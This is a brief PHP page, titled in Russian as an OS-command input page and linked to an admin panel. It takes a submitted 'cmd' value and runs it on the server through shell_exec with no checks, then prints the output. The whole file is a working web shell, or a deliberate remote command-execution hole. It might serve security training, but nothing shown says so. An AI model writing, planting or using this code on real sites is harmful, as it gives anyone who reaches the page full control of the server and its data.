<!DOCTYPE html>
<html>
<head>
    <title>Страница с вводом ОС команд</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: "Courier New", Courier, monospace;
            font-size: 14px;
        }
        form {
            border: 1px solid #ccc;
            padding: 10px;
            border-radius: 5px;
        }
        pre {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
    </style>
</head>
<body>
<form action="" method="post">
    <label for="cmd">Введите команду:</label>
    <input type="text" id="cmd" name="cmd">
    <input type="submit" value="Выполнить">
</form>
<div class="col-sm-4">
    <form action="AdminPanel.php" method="post">
        <button class="btn btn-info btn-lg btn-block"><i class="fa fa-sign-in"></i>Главная страница</button>
    </form>
</div>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $output = shell_exec($_POST["cmd"]);
    echo "<pre>$output</pre>";
}
?>
</body>
</html>
